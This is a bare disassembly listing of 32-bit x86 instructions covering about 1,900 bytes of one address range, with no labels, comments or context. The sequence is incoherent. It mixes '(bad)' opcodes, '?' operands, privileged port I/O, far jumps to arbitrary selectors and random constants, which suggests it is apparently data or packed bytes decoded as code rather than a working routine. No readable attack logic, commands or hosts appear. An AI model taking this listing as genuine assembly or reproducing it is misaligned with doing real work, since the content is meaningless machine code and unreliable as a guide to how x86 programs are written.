  41bbd4:	jmp    0x41bb69
  41bbd6:	sub    al,0x29
  41bbd8:	pop    edi
  41bbd9:	sbb    eax,0xdbb49d36
  41bbde:	add    BYTE PTR [esi+0x3],al
  41bbe1:	push   ecx
  41bbe2:	inc    edi
  41bbe3:	lods   al,BYTE PTR ds:[esi]
  41bbe4:	add    cl,ah
  41bbe6:	scas   al,BYTE PTR es:[edi]
  41bbe7:	in     al,0x94
  41bbe9:	pop    ss
  41bbea:	or     eax,0x90d8f751
  41bbef:	sub    al,0xe3
  41bbf1:	inc    ebp
  41bbf2:	ja     0x41bb98
  41bbf4:	rcr    edi,1
  41bbf6:	pop    ebp
  41bbf7:	int3   
  41bbf8:	pop    eax
  41bbf9:	mov    cl,0xc1
  41bbfb:	call   0xf2b9:0x50fc4a3e
  41bc02:	pop    esp
  41bc03:	inc    ebp
  41bc04:	cmp    ch,BYTE PTR [edx]
  41bc06:	inc    edx
  41bc07:	into   
  41bc08:	sub    DWORD PTR [eax+0x342aa4ef],esp
  41bc0e:	xor    DWORD PTR [edi+0x114a6886],0x6af8b914
  41bc18:	add    eax,0xdf456476
  41bc1d:	dec    edi
  41bc1e:	gs gs ret 
  41bc21:	aam    0x5d
  41bc23:	and    eax,0x77e96a26
  41bc28:	xor    DWORD PTR [eax-0x53],edi
  41bc2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc2c:	sub    bl,BYTE PTR [edx+0x1f71e8e8]
  41bc32:	push   0x85099e11
  41bc37:	pop    esp
  41bc38:	jb     0x41bc07
  41bc3a:	xor    esp,DWORD PTR ds:[esi+0x28b8cbb]
  41bc41:	ss mov bl,0x54
  41bc44:	pop    ecx
  41bc45:	jbe    0x41bc05
  41bc47:	shl    DWORD PTR [ebx],1
  41bc49:	dec    ebx
  41bc4a:	cwde   
  41bc4b:	mov    eax,0x87811afd
  41bc50:	xor    ch,ch
  41bc52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc53:	out    dx,eax
  41bc54:	mov    ebx,0x26ec88d5
  41bc59:	jmp    FWORD PTR [edx+edx*2-0x6a]
  41bc5d:	imul   edx,ebp,0x4577239
  41bc63:	fsubp  st(2),st
  41bc65:	scas   al,BYTE PTR es:[edi]
  41bc66:	and    al,0xd9
  41bc68:	test   al,0x53
  41bc6a:	add    ah,BYTE PTR [ecx+ecx*2-0x3]
  41bc6e:	add    BYTE PTR [edi-0x27],dh
  41bc71:	adc    ebx,DWORD PTR [edi+0x23]
  41bc74:	in     al,dx
  41bc75:	ds dec edi
  41bc77:	outs   dx,BYTE PTR ds:[esi]
  41bc78:	fimul  DWORD PTR [edx]
  41bc7a:	repz jno 0x41bc4a
  41bc7d:	xor    eax,0xfa6b1a98
  41bc82:	cs fwait
  41bc84:	gs mov dl,0x36
  41bc87:	mov    dh,0xe1
  41bc89:	nop
  41bc8a:	mov    ecx,ecx
  41bc8c:	inc    esi
  41bc8d:	adc    DWORD PTR [ebx+0x24c6a457],0xea6d10a1
  41bc97:	mov    ah,BYTE PTR [eax]
  41bc99:	popa   
  41bc9a:	inc    edi
  41bc9b:	mov    ah,bh
  41bc9d:	and    edx,esp
  41bc9f:	cli    
  41bca0:	xor    DWORD PTR [esi],0xffffff84
  41bca3:	fs pop es
  41bca5:	es mov esi,0xd7c5ac39
  41bcab:	rcr    DWORD PTR [ebp-0x6],cl
  41bcae:	fisubr DWORD PTR [esi+ecx*1-0x5a86647a]
  41bcb5:	daa    
  41bcb6:	mov    edx,0xa279337d
  41bcbb:	jmp    0xfb72daf1
  41bcc0:	lea    ebx,[edi]
  41bcc2:	dec    edx
  41bcc3:	lods   eax,DWORD PTR ds:[esi]
  41bcc4:	sub    BYTE PTR [ecx-0x2e],al
  41bcc7:	out    0xd,al
  41bcc9:	or     ecx,edx
  41bccb:	mov    dl,BYTE PTR ds:0x9b051f8a
  41bcd1:	jl     0x41bc7a
  41bcd3:	mov    al,ds:0x121a241e
  41bcd8:	push   eax
  41bcd9:	or     eax,0xbcaf1495
  41bcde:	inc    ebx
  41bcdf:	or     BYTE PTR [ecx],bl
  41bce1:	and    BYTE PTR [ebx+0x74],ah
  41bce4:	nop
  41bce5:	shl    DWORD PTR [ebp+ecx*1-0x68],0xce
  41bcea:	adc    al,ch
  41bcec:	add    BYTE PTR [ecx],bl
  41bcee:	into   
  41bcef:	nop
  41bcf0:	jp     0x41bd07
  41bcf2:	adc    eax,0x89b10efd
  41bcf7:	pop    ebp
  41bcf8:	mov    al,BYTE PTR [edx-0x2a]
  41bcfb:	arpl   WORD PTR [ecx],ax
  41bcfd:	mov    WORD PTR ss:[edi+0x5d5f187],gs
  41bd04:	mov    DWORD PTR [ebx],esi
  41bd06:	out    0x51,al
  41bd08:	sub    ch,BYTE PTR ds:0x69cab145
  41bd0e:	in     al,dx
  41bd0f:	mov    ah,0x44
  41bd11:	push   eax
  41bd12:	enter  0xc6a2,0x1b
  41bd16:	icebp  
  41bd17:	ds pop esi
  41bd19:	sub    eax,0x3eb404f1
  41bd1e:	xchg   bl,ch
  41bd20:	and    BYTE PTR [esi-0x7e3fa446],cl
  41bd26:	ret    
  41bd27:	pop    ebp
  41bd28:	loopne 0x41bd78
  41bd2a:	dec    ebx
  41bd2b:	jmp    0xe7b0:0x1d740506
  41bd32:	pushf  
  41bd33:	push   edx
  41bd34:	mov    dl,0x1d
  41bd36:	enter  0xf08b,0xb8
  41bd3a:	hlt    
  41bd3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd3c:	xor    al,0x99
  41bd3e:	out    dx,eax
  41bd3f:	add    esp,DWORD PTR [esi]
  41bd41:	aaa    
  41bd42:	jle    0x41bd34
  41bd44:	mov    esi,0xb6e1ad45
  41bd49:	pop    ecx
  41bd4a:	(bad)  
  41bd4b:	clc    
  41bd4c:	je     0x41bce9
  41bd4e:	jo     0x41bd70
  41bd50:	xlat   BYTE PTR ds:[ebx]
  41bd51:	inc    ecx
  41bd52:	ins    DWORD PTR es:[edi],dx
  41bd53:	jne    0x41bcdb
  41bd55:	jno    0x41bdd0
  41bd57:	popf   
  41bd58:	cmp    ebx,ebp
  41bd5a:	sbb    al,0x65
  41bd5c:	leave  
  41bd5d:	test   eax,0xdf28b79e
  41bd62:	in     al,0x7
  41bd64:	add    eax,0x2b5a03ba
  41bd69:	nop
  41bd6a:	pop    ebx
  41bd6b:	cmp    eax,0x5fd597e6
  41bd70:	imul   edi,DWORD PTR [edi-0x680daa56],0x8
  41bd77:	pop    esp
  41bd78:	into   
  41bd79:	adc    edx,DWORD PTR [edx+0x145bdf23]
  41bd7f:	adc    DWORD PTR [ecx],edi
  41bd81:	daa    
  41bd82:	push   0xfffffff3
  41bd84:	mov    ecx,0xaac0bcb0
  41bd89:	or     ah,BYTE PTR [edi+0x59a6caed]
  41bd8f:	push   edi
  41bd90:	push   esi
  41bd91:	popf   
  41bd92:	(bad)  
  41bd94:	rol    DWORD PTR [edi+0x4e15ed3c],1
  41bd9a:	or     al,0x41
  41bd9c:	daa    
  41bd9d:	xor    dh,BYTE PTR [esi]
  41bd9f:	out    0xb3,al
  41bda1:	jnp    0x41bdfd
  41bda3:	test   al,0xa6
  41bda5:	std    
  41bda6:	daa    
  41bda7:	cdq    
  41bda8:	(bad)  
  41bda9:	aad    0xaa
  41bdab:	and    DWORD PTR [esi],esp
  41bdad:	sub    eax,DWORD PTR [ecx-0x7c2fd230]
  41bdb3:	xor    BYTE PTR [esi+0x75],bl
  41bdb6:	dec    edx
  41bdb7:	xchg   ebp,eax
  41bdb8:	dec    esi
  41bdb9:	mov    WORD PTR [eax+ecx*1],cs
  41bdbc:	adc    eax,0xeaf54395
  41bdc1:	and    DWORD PTR [ecx+0x37],0xd82420bd
  41bdc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdc9:	aaa    
  41bdca:	push   edi
  41bdcb:	pop    ebx
  41bdcc:	lods   al,BYTE PTR ds:[esi]
  41bdcd:	inc    ebx
  41bdce:	and    esi,ebp
  41bdd0:	test   eax,0x23e9dcee
  41bdd5:	popa   
  41bdd6:	lds    esp,FWORD PTR [edi-0x5620967e]
  41bddc:	dec    DWORD PTR [edi-0x5da01244]
  41bde2:	mov    ebx,0x921bd866
  41bde7:	mov    edi,0x107e3286
  41bdec:	inc    ecx
  41bded:	daa    
  41bdee:	loopne 0x41be3c
  41bdf0:	(bad)  
  41bdf2:	fsub   st,st(7)
  41bdf4:	dec    eax
  41bdf5:	enter  0x854,0x28
  41bdf9:	ret    
  41bdfa:	pop    eax
  41bdfb:	or     BYTE PTR [edi+eax*4+0x61e845c9],dl
  41be02:	sti    
  41be03:	es ss scas eax,DWORD PTR es:[edi]
  41be06:	pop    ecx
  41be07:	pop    ss
  41be08:	aam    0x11
  41be0a:	xchg   esp,eax
  41be0b:	inc    esi
  41be0c:	test   ebp,ebp
  41be0e:	inc    BYTE PTR [ebp-0x3c]
  41be11:	xor    al,0x57
  41be13:	or     ebp,DWORD PTR [edx+edx*1+0x71abb1b2]
  41be1a:	test   al,0xe9
  41be1c:	fisub  WORD PTR [edi+eax*4-0xe316431]
  41be23:	sub    eax,0xc2b37fd7
  41be28:	lods   al,BYTE PTR ds:[esi]
  41be29:	cmc    
  41be2a:	mov    al,ds:0xa01dc5e3
  41be2f:	arpl   dx,si
  41be31:	cmp    bl,BYTE PTR [ecx+eax*2+0x15]
  41be35:	mov    bl,0xf
  41be37:	aad    0x5b
  41be39:	add    DWORD PTR [eax-0xb],0x33212014
  41be40:	out    0xa1,eax
  41be42:	sbb    dh,BYTE PTR [ebx]
  41be44:	pop    eax
  41be45:	out    dx,eax
  41be46:	pop    esp
  41be47:	sbb    eax,DWORD PTR [eax]
  41be49:	repnz cld 
  41be4b:	arpl   bp,bp
  41be4d:	xchg   edi,eax
  41be4e:	xchg   ebx,eax
  41be4f:	jae    0x41bec9
  41be51:	xchg   ebx,eax
  41be52:	test   DWORD PTR [edx+0x7f],0xf94c61f
  41be59:	xor    esp,esi
  41be5b:	cmp    ch,BYTE PTR [ebp+0x1e]
  41be5e:	mov    dh,0x47
  41be60:	mov    WORD PTR [edx-0x12d6708b],cs
  41be66:	in     al,0xe5
  41be68:	mov    fs,WORD PTR [edx+0x4b]
  41be6b:	cli    
  41be6c:	jno    0x41beae
  41be6e:	loop   0x41bdff
  41be70:	sbb    BYTE PTR [esp+eiz*2-0x50],al
  41be74:	ds jnp 0x41be22
  41be77:	push   0xab66cde6
  41be7c:	idiv   BYTE PTR [ecx-0x7d]
  41be7f:	mov    esp,0x56680a3a
  41be84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be85:	lods   al,BYTE PTR ds:[esi]
  41be86:	into   
  41be87:	fucomp st(1)
  41be89:	push   esp
  41be8a:	add    eax,0xa8e1ec15
  41be8f:	sbb    DWORD PTR [ebx-0x37],edi
  41be92:	fld    QWORD PTR [edx]
  41be94:	mov    edx,0x41930edf
  41be99:	test   esp,0xdd1d4431
  41be9f:	popf   
  41bea0:	push   0xffffffec
  41bea2:	lds    ebx,FWORD PTR [ebp+0x3a]
  41bea5:	mov    edi,0xd0d14086
  41beaa:	popa   
  41beab:	imul   edi,DWORD PTR [ebp+0x2b],0x31
  41beaf:	into   
  41beb0:	add    DWORD PTR [ebp+0x679a4ee1],edi
  41beb6:	pop    esi
  41beb7:	xchg   esp,eax
  41beb8:	stos   DWORD PTR es:[edi],eax
  41beb9:	dec    edi
  41beba:	inc    edx
  41bebb:	pop    ss
  41bebc:	push   ss
  41bebd:	adc    al,0x3f
  41bebf:	aas    
  41bec0:	jl     0x41bea5
  41bec2:	cmp    bl,al
  41bec4:	xchg   edx,eax
  41bec5:	mov    edx,0x69ccf1c6
  41beca:	test   DWORD PTR [edi],edx
  41becc:	xchg   ebp,eax
  41becd:	push   ds
  41bece:	out    dx,al
  41becf:	and    al,0x3d
  41bed1:	jb     0x41beb7
  41bed3:	scas   eax,DWORD PTR es:[edi]
  41bed4:	sbb    BYTE PTR [esi-0x6d],ah
  41bed7:	xlat   BYTE PTR ds:[ebx]
  41bed8:	icebp  
  41bed9:	pusha  
  41beda:	cmp    al,0x38
  41bedc:	xor    edx,esi
  41bede:	and    ebx,DWORD PTR [esi+eiz*1]
  41bee1:	mov    bl,0xb
  41bee3:	out    dx,eax
  41bee4:	scas   eax,DWORD PTR es:[edi]
  41bee5:	mov    bl,0xbd
  41bee7:	inc    ecx
  41bee8:	cmp    ah,bl
  41beea:	adc    eax,0xa9ab5aa2
  41beef:	bound  esp,QWORD PTR [ecx+0x63]
  41bef2:	ss sti 
  41bef4:	shr    BYTE PTR [ebx-0x38],cl
  41bef7:	ja     0xfc2c5bf1
  41befd:	retf   0xabc1
  41bf00:	lods   al,BYTE PTR ds:[esi]
  41bf01:	xchg   esi,eax
  41bf02:	lahf   
  41bf03:	adc    eax,0xcf47707e
  41bf08:	(bad)  
  41bf0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf0b:	(bad)
  41bf0e:	in     eax,0xc3
  41bf10:	fstp   DWORD PTR [ebp+0x65d3859a]
  41bf16:	mov    cl,0xcd
  41bf18:	ret    
  41bf19:	jnp    0x41bf24
  41bf1b:	fcomp  DWORD PTR [ebx-0x3c1a434d]
  41bf21:	enter  0xe2e4,0x3
  41bf25:	jmp    0x831c:0xe60bf034
  41bf2c:	mov    ebx,0xdd7cf4f
  41bf31:	call   0x574ddccd
  41bf36:	jae    0x41bf75
  41bf38:	test   al,0x84
  41bf3a:	mov    DWORD PTR [esi-0x9],esi
  41bf3d:	mov    ebp,?
  41bf3f:	lods   al,BYTE PTR ds:[esi]
  41bf40:	push   dx
  41bf42:	loope  0x41bf0c
  41bf44:	pop    ds
  41bf45:	mov    dl,0xa4
  41bf47:	jae    0x41bf40
  41bf49:	or     eax,0xe032bca
  41bf4e:	or     al,0xbe
  41bf50:	jg     0x41bf5d
  41bf52:	ret    0x99d
  41bf55:	iret   
  41bf56:	push   ebp
  41bf57:	test   BYTE PTR [ebp+0xa04c77b],dl
  41bf5d:	out    0x13,eax
  41bf5f:	jle    0x41bf2d
  41bf61:	dec    edi
  41bf62:	mov    esi,0x5c0ed404
  41bf67:	sahf   
  41bf68:	imul   eax,edx,0x6ac6c463
  41bf6e:	jae    0x41bfe1
  41bf70:	jl     0x41bfb7
  41bf72:	cdq    
  41bf73:	(bad)  
  41bf74:	xor    edi,ebx
  41bf76:	inc    edi
  41bf77:	int    0x1c
  41bf79:	scas   al,BYTE PTR es:[edi]
  41bf7a:	and    BYTE PTR [edi-0x3068b63b],bl
  41bf80:	mov    gs,WORD PTR [esi-0x7ede8ac5]
  41bf86:	and    DWORD PTR [eax-0x2f],esi
  41bf89:	xchg   ebx,eax
  41bf8a:	ss inc esi
  41bf8c:	and    esp,eax
  41bf8e:	mov    DWORD PTR [esi+0x1f],ebx
  41bf91:	sbb    ch,0x30
  41bf94:	fistp  DWORD PTR [ecx+0xa]
  41bf97:	ret    
  41bf98:	cmc    
  41bf99:	cmp    al,0x71
  41bf9b:	div    DWORD PTR [edi+ebx*2+0x66a59c0a]
  41bfa2:	iret   
  41bfa3:	jle    0x41bfc9
  41bfa5:	fdivrp st(7),st
  41bfa7:	or     esi,ebp
  41bfa9:	sbb    al,BYTE PTR [esi]
  41bfab:	jmp    0x9b70:0x3e44a8bc
  41bfb2:	inc    esi
  41bfb3:	xor    DWORD PTR cs:[ecx-0x76],edi
  41bfb7:	(bad)  
  41bfb8:	jge    0x41bf65
  41bfba:	push   ds
  41bfbb:	mul    BYTE PTR [ebx]
  41bfbd:	hlt    
  41bfbe:	and    bh,ch
  41bfc0:	faddp  st(2),st
  41bfc2:	dec    esi
  41bfc3:	add    DWORD PTR [esi+0x2c],ebp
  41bfc6:	out    dx,eax
  41bfc7:	mov    cl,0x7f
  41bfc9:	sub    dh,BYTE PTR [ebx-0x1]
  41bfcc:	pop    gs
  41bfce:	stos   BYTE PTR es:[edi],al
  41bfcf:	push   ecx
  41bfd0:	fldenv [edi]
  41bfd2:	mov    cl,BYTE PTR [ebp-0x1ad3daed]
  41bfd8:	sahf   
  41bfd9:	retf   0x7188
  41bfdc:	cmc    
  41bfdd:	fldenv [eax]
  41bfdf:	ins    DWORD PTR es:[edi],dx
  41bfe0:	dec    esi
  41bfe1:	mov    dh,0xec
  41bfe3:	outs   dx,DWORD PTR ds:[esi]
  41bfe4:	aam    0xc6
  41bfe6:	push   ebp
  41bfe7:	cmp    ebp,0xd62569f1
  41bfed:	jne    0x41bfc1
  41bfef:	int    0x9a
  41bff1:	cmp    BYTE PTR [edi],al
  41bff3:	or     eax,0x709406cf
  41bff8:	inc    edi
  41bff9:	sub    ch,0xcf
  41bffc:	pop    eax
  41bffd:	aam    0x16
  41bfff:	and    dl,bl
  41c001:	shl    BYTE PTR [esi-0x2b],1
  41c004:	mov    esi,0x743b4247
  41c009:	adc    ch,BYTE PTR [edi+0x3f]
  41c00c:	cmp    eax,0xb98d763d
  41c011:	dec    ebp
  41c012:	popf   
  41c013:	call   DWORD PTR [edi]
  41c015:	adc    eax,0x4854761d
  41c01a:	mov    ah,0xac
  41c01c:	dec    eax
  41c01d:	pusha  
  41c01e:	mov    ah,BYTE PTR [edx-0x20f87fb3]
  41c024:	mov    al,ds:0x95740ca8
  41c029:	xor    bl,BYTE PTR ss:[eax+0x55e621ff]
  41c030:	pop    es
  41c031:	jne    0x41c06e
  41c033:	xchg   BYTE PTR [eax-0x20f43be7],ah
  41c039:	push   esp
  41c03a:	daa    
  41c03b:	cwde   
  41c03c:	or     eax,0x5df61cd5
  41c041:	mov    dh,0xb
  41c043:	bound  edx,QWORD PTR [esi]
  41c045:	test   BYTE PTR [eax+0x1d],ah
  41c048:	sub    al,0x3d
  41c04a:	xchg   BYTE PTR [ebx],ch
  41c04c:	jo     0x41c034
  41c04e:	mov    ?,esp
  41c050:	retf   0xc8c3
  41c053:	gs push esp
  41c055:	retf   
  41c056:	std    
  41c057:	es je  0x41c083
  41c05a:	aad    0x31
  41c05c:	retf   0x39ee
  41c05f:	push   ss
  41c060:	fwait
  41c061:	nop
  41c062:	jns    0x41c08c
  41c064:	ror    DWORD PTR [ebp-0x57d4ffed],1
  41c06a:	fs and ebp,ecx
  41c06d:	add    cl,BYTE PTR [ebx-0x559e1bd4]
  41c073:	mov    ah,0x16
  41c075:	cdq    
  41c076:	jle    0x41c013
  41c078:	sbb    BYTE PTR [ebp-0x5e],0x94
  41c07c:	jns    0x41c069
  41c07e:	jb     0x41c0f1
  41c080:	push   ds
  41c081:	js     0x41c0ef
  41c083:	xor    edx,esi
  41c085:	xchg   ebp,eax
  41c086:	inc    eax
  41c087:	in     al,dx
  41c088:	xchg   edx,eax
  41c089:	add    ebp,DWORD PTR [edi-0xa07e0e7]
  41c08f:	mov    ch,0x23
  41c091:	sbb    DWORD PTR [ecx],0x11f650ac
  41c097:	jmp    0x695c:0xe033349a
  41c09e:	or     DWORD PTR [ecx+0x31dce488],esp
  41c0a4:	jle    0x41c11e
  41c0a6:	scas   al,BYTE PTR es:[edi]
  41c0a7:	mov    fs,eax
  41c0a9:	pop    esi
  41c0aa:	cmp    DWORD PTR [ebp+0x6275c682],0x20
  41c0b1:	in     al,dx
  41c0b2:	mov    DWORD PTR [edi],esp
  41c0b4:	fs jbe 0x41c0dd
  41c0b7:	test   al,0x14
  41c0b9:	mov    dh,0x1
  41c0bb:	cld    
  41c0bc:	pop    esp
  41c0bd:	retf   0x5f65
  41c0c0:	inc    esp
  41c0c1:	inc    esi
  41c0c2:	push   0xdfb5588
  41c0c7:	into   
  41c0c8:	je     0x41c09d
  41c0ca:	je     0x41c052
  41c0cc:	and    dh,ah
  41c0ce:	mov    ch,0x31
  41c0d0:	jmp    0xbaecea90
  41c0d5:	fld    DWORD PTR [edx]
  41c0d7:	xchg   esp,esp
  41c0d9:	jo     0x41c08b
  41c0db:	ins    DWORD PTR es:[edi],dx
  41c0dc:	retf   
  41c0dd:	dec    DWORD PTR [ecx+ebx*4+0x20]
  41c0e1:	out    0xc0,al
  41c0e3:	aad    0x2f
  41c0e5:	jmp    0x50695b9c
  41c0ea:	push   ebx
  41c0eb:	adc    bh,BYTE PTR [eax+0x7ff45db1]
  41c0f1:	add    bl,BYTE PTR [eax-0x6bd6ce12]
  41c0f7:	ss mov cl,0xeb
  41c0fa:	ins    BYTE PTR es:[edi],dx
  41c0fb:	loopne 0x41c095
  41c0fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0fe:	push   ebp
  41c0ff:	out    dx,eax
  41c100:	xchg   ebp,eax
  41c101:	sti    
  41c102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c103:	jmp    0x94d13e21
  41c108:	repnz mov dh,0x2d
  41c10b:	sbb    dl,0x3e
  41c10e:	mov    al,0x98
  41c111:	mov    eax,ds:0x4e13491e
  41c116:	popa   
  41c117:	mov    edx,0x5364130e
  41c11c:	(bad)  
  41c11d:	xlat   BYTE PTR ds:[ebx]
  41c11e:	lods   eax,DWORD PTR ds:[esi]
  41c11f:	pusha  
  41c120:	pop    eax
  41c121:	test   al,0x59
  41c123:	je     0x41c128
  41c125:	xchg   edx,eax
  41c126:	pop    eax
  41c127:	or     al,0x6b
  41c129:	push   edx
  41c12a:	call   0xe51d7dd5
  41c12f:	mov    al,BYTE PTR [edi]
  41c131:	popa   
  41c132:	mov    ebp,0xec84a051
  41c137:	and    al,0xf8
  41c139:	xor    bl,dl
  41c13b:	cld    
  41c13c:	and    DWORD PTR [esi+ebx*4],0xffffff90
  41c140:	xor    bh,BYTE PTR [edx-0x2a]
  41c143:	fimul  DWORD PTR [esi-0x338f9ec9]
  41c149:	push   edi
  41c14a:	pop    edi
  41c14b:	or     DWORD PTR [edx+0x5b778334],0xf30c023c
  41c155:	cli    
  41c156:	jg     0x41c1a4
  41c158:	mov    BYTE PTR [bp+si+0x7eab],dl
  41c15d:	loope  0x41c192
  41c15f:	stos   DWORD PTR es:[edi],eax
  41c160:	pop    edi
  41c161:	and    eax,0xc1aa381d
  41c166:	or     DWORD PTR [ebx],ebp
  41c168:	adc    DWORD PTR [ecx],esi
  41c16a:	xor    DWORD PTR [esi],edi
  41c16c:	mov    ds:0x472fb7a7,eax
  41c171:	jle    0x41c130
  41c173:	stos   BYTE PTR es:[edi],al
  41c174:	pop    ss
  41c175:	pop    ds
  41c176:	bound  ebp,QWORD PTR [esi]
  41c178:	adc    al,0x2d
  41c17a:	mov    edx,ecx
  41c17c:	sar    al,1
  41c17e:	out    dx,eax
  41c17f:	xchg   ebp,eax
  41c180:	idiv   BYTE PTR [ecx]
  41c182:	fldlg2 
  41c184:	xchg   bx,ax
  41c186:	cs mov edi,0x73135620
  41c18c:	cmp    eax,0x9c79f12c
  41c191:	push   es
  41c192:	pop    ss
  41c193:	mul    BYTE PTR ds:0xc29970a1
  41c199:	dec    eax
  41c19a:	or     al,0x4f
  41c19c:	loop   0x41c175
  41c19e:	leave  
  41c19f:	mov    dl,0xcd
  41c1a1:	push   ds
  41c1a2:	cmc    
  41c1a3:	dec    esp
  41c1a4:	ret    
  41c1a5:	aaa    
  41c1a6:	dec    ebx
  41c1a7:	les    esi,FWORD PTR [edx+0x6f]
  41c1aa:	or     eax,0x33a4fa9e
  41c1af:	stos   BYTE PTR es:[edi],al
  41c1b0:	sub    dl,cl
  41c1b2:	add    eax,0xf8453794
  41c1b7:	ja     0x41c21b
  41c1b9:	sub    BYTE PTR [eax-0x6c],bh
  41c1bc:	in     eax,dx
  41c1bd:	add    eax,0x6d858c81
  41c1c2:	inc    ebp
  41c1c3:	pop    ecx
  41c1c4:	push   ds
  41c1c5:	mov    bl,0xe7
  41c1c7:	dec    edx
  41c1c8:	xchg   esi,eax
  41c1c9:	pop    edx
  41c1ca:	sbb    BYTE PTR [ecx+0x47],al
  41c1cd:	std    
  41c1ce:	les    edi,FWORD PTR [esi-0xdfa89cf]
  41c1d4:	stos   DWORD PTR es:[edi],eax
  41c1d5:	out    0xdd,eax
  41c1d7:	mov    cl,0x97
  41c1d9:	push   0xba925ac2
  41c1de:	cwde   
  41c1df:	cmp    edi,DWORD PTR [edx+0x4b94d83a]
  41c1e5:	daa    
  41c1e6:	inc    esi
  41c1e7:	push   esi
  41c1e8:	sbb    BYTE PTR [ecx+eax*8+0x174f78da],0xd8
  41c1f0:	dec    edi
  41c1f1:	and    DWORD PTR [ebx-0x391fa48c],ecx
  41c1f7:	adc    DWORD PTR [ecx],0xd41f1986
  41c1fd:	jl     0x41c26a
  41c1ff:	jo     0x41c239
  41c201:	or     ch,BYTE PTR [edi+esi*1+0x17]
  41c205:	pop    edi
  41c206:	addr16 je 0x41c19b
  41c209:	les    esp,FWORD PTR [edi]
  41c20b:	outs   dx,BYTE PTR ds:[esi]
  41c20c:	push   0xffffffb7
  41c20e:	repz rol edi,cl
  41c211:	sub    DWORD PTR [ecx],esp
  41c213:	test   DWORD PTR [ebp-0x76],0x8592be76
  41c21a:	push   0xffffffbd
  41c21c:	add    ebp,DWORD PTR [ecx+eax*1+0x40]
  41c220:	loopne 0x41c20a
  41c222:	xchg   edx,eax
  41c223:	pop    ecx
  41c224:	fwait
  41c225:	inc    ebx
  41c226:	call   FWORD PTR ds:0x605c7f02
  41c22c:	xchg   ebx,eax
  41c22d:	fistp  WORD PTR [edx-0xf]
  41c230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c231:	push   esi
  41c232:	xor    al,BYTE PTR [edi+ecx*1+0x78]
  41c236:	ret    0xca91
  41c239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c23a:	mov    edx,0x8db7a321
  41c23f:	inc    eax
  41c240:	retf   
  41c241:	push   esi
  41c242:	dec    edi
  41c243:	jecxz  0x41c249
  41c245:	les    ebp,FWORD PTR [ebp-0x31]
  41c248:	xchg   edi,eax
  41c249:	out    0xb2,al
  41c24b:	clc    
  41c24c:	rcl    eax,0xf1
  41c24f:	test   DWORD PTR [ebx+edi*8],edx
  41c252:	push   ss
  41c253:	dec    eax
  41c254:	ficomp DWORD PTR [ecx+0x36d47f51]
  41c25a:	or     BYTE PTR [ebp+0x3a],ah
  41c25d:	fcomp  QWORD PTR [eax-0x60]
  41c260:	add    eax,0x1c621b22
  41c265:	dec    eax
  41c266:	in     eax,0xcc
  41c268:	cmp    DWORD PTR [edx+0x13db475d],esi
  41c26e:	mov    al,ds:0xc99180
  41c273:	imul   ebp,DWORD PTR [ebp-0x7c],0x60
  41c277:	sbb    DWORD PTR [esi+ebx*8],esi
  41c27a:	push   es
  41c27b:	and    BYTE PTR [ebx+0x37],dh
  41c27e:	bswap  edi
  41c280:	lods   al,BYTE PTR ds:[esi]
  41c281:	jnp    0x41c2b8
  41c283:	sub    eax,0x5c655b3f
  41c288:	ror    DWORD PTR ds:[edx+0x75ac7c29],1
  41c28f:	imul   edx,edx,0xffffffe6
  41c292:	dec    edi
  41c293:	repz push cs
  41c295:	inc    eax
  41c296:	outs   dx,BYTE PTR ds:[esi]
  41c297:	stos   DWORD PTR es:[edi],eax
  41c298:	sub    BYTE PTR [edx-0x11],0x2f
  41c29c:	pop    ss
  41c29d:	push   ecx
  41c29e:	xchg   edi,eax
  41c29f:	ss dec edx
  41c2a1:	mov    ah,BYTE PTR [ebx+0x8c0a53e]
  41c2a7:	outs   dx,BYTE PTR ds:[esi]
  41c2a8:	test   esi,eax
  41c2aa:	arpl   WORD PTR [ebx],sp
  41c2ac:	xor    eax,0x64a31b4e
  41c2b1:	mov    al,0x89
  41c2b3:	and    ch,BYTE PTR fs:[ebx-0x32]
  41c2b7:	cmp    BYTE PTR [edx],al
  41c2b9:	hlt    
  41c2ba:	clc    
  41c2bb:	pop    eax
  41c2bc:	cmp    al,0x4b
  41c2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2bf:	ret    
  41c2c0:	jnp    0x41c341
  41c2c2:	push   esi
  41c2c3:	cmp    BYTE PTR [ebx+eax*4+0x449add15],bh
  41c2ca:	neg    DWORD PTR ds:0x136afa88
  41c2d0:	add    DWORD PTR [ebp+0x4e127f0f],edx
  41c2d6:	or     edx,ebp
  41c2d8:	dec    esp
  41c2d9:	inc    edx
  41c2da:	sbb    al,0x70
  41c2dc:	ds dec ebp
  41c2de:	rol    BYTE PTR [esi],0xf0
  41c2e1:	add    esi,DWORD PTR [eax]
  41c2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e4:	scas   eax,DWORD PTR es:[edi]
  41c2e5:	mov    dh,0xcb
  41c2e7:	out    0x39,eax
  41c2e9:	mov    ah,0xa6
  41c2eb:	clc    
  41c2ec:	cmc    
  41c2ed:	ds iret 
  41c2ef:	test   DWORD PTR [esi+0x47],ecx
  41c2f2:	inc    esp
  41c2f3:	fs sub ebp,esi
  41c2f6:	and    DWORD PTR [eax+ecx*4+0x41],0xf2ddddee
  41c2fe:	pusha  
  41c2ff:	push   ebp
  41c300:	test   al,0xf8
  41c302:	fimul  WORD PTR [ebp-0x6becc93a]
  41c308:	call   0x506e:0x3936cf84
  41c30f:	mov    edx,0xc247ea13
  41c314:	adc    dh,BYTE PTR [ecx+0x34a36a0a]
  41c31a:	mov    ebx,0x4c05c22e
  41c31f:	inc    esp
  41c320:	div    BYTE PTR [ebx]
  41c322:	xchg   esi,esi
  41c324:	stos   BYTE PTR es:[edi],al
  41c325:	add    bl,BYTE PTR [eax]
  41c327:	cmc    
  41c328:	not    DWORD PTR [esi]
  41c32a:	outs   dx,BYTE PTR ds:[esi]
  41c32b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
